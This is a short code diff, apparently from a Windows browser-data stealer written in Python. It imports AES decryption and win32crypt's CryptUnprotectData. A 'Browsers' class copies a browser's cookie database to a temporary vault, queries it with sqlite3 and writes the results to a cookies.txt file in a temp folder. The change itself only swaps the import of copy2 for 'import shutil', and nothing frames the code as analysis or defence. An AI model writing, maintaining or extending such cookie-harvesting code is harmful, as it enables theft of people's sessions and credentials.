@@ -6,7 +6,7 @@ import random
 import sqlite3
 import threading
 from Cryptodome.Cipher import AES
-from shutil import copy2
+import shutil
 from typing import Union
 from win32crypt import CryptUnprotectData
 
@@ -141,7 +141,7 @@ class Browsers:
 		if not os.path.isfile(path):
 			return
 		cookievault = create_temp()
-		copy2(path, cookievault)
+		shutil.copy2(path, cookievault)
 		conn = sqlite3.connect(cookievault)
 		cursor = conn.cursor()
 		with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
